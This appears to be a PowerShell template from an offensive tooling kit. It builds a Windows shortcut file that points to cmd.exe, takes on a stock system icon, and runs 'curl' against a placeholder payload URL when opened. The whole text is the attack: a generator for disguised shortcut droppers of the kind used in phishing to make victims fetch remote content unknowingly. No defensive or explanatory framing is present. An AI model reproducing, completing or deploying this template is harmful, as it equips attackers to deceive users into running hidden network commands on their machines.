$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("{{output}}")
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.IconLocation = "%SystemRoot%\System32\shell32.dll, 28"
$Shortcut.Arguments = "/c (curl {{payload}})"
$Shortcut.Save()
